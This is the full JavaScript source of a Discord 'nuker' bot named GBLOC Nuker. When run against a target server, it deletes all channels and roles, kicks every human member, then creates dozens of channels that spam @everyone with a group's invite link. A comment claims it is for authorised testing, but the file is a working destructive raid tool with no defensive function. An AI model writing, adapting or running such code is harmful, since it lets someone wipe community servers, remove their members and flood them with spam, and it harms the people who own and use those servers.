// GBLOC Nuker - Created by Nikz
// Use only on servers you own or have permission to test on.

const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const config = require('./config.json');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages
    ]
});

client.once('ready', async () => {
    console.clear();
    console.log('============================');
    console.log('GBLOC Nuker - by Nikz');
    console.log(`Logged in as ${client.user.tag}`);
    console.log('============================\n');

    const guild = client.guilds.cache.get(config.targetGuildId);
    if (!guild) {
        console.log('Guild not found.');
        return;
    }

    console.log(`Target: ${guild.name} (${guild.id})`);

    await Promise.allSettled(guild.channels.cache.map(channel => channel.delete().catch(() => {})));
    console.log('Channels deleted.');

    await Promise.allSettled(guild.roles.cache.filter(role => role.name !== '@everyone').map(role => role.delete().catch(() => {})));
    console.log('Roles deleted.');

    const members = await guild.members.fetch();
    await Promise.allSettled(members.filter(member => !member.user.bot).map(member => member.kick('GBLOC Nuker').catch(() => {})));
    console.log('Members kicked.');

    for (let i = 0; i < 30; i++) {
        setTimeout(async () => {
            try {
                const channel = await guild.channels.create({
                    name: 'gbloc-on-top',
                    type: ChannelType.GuildText
                });

                for (let j = 0; j < 5; j++) {
                    channel.send('@everyone **GBLOC ON TOP**\nhttps://discord.gg/gbloc').catch(() => {});
                }
            } catch (err) {}
        }, i * 500);
    }

    console.log('Spamming started.');
});

client.login(config.token);
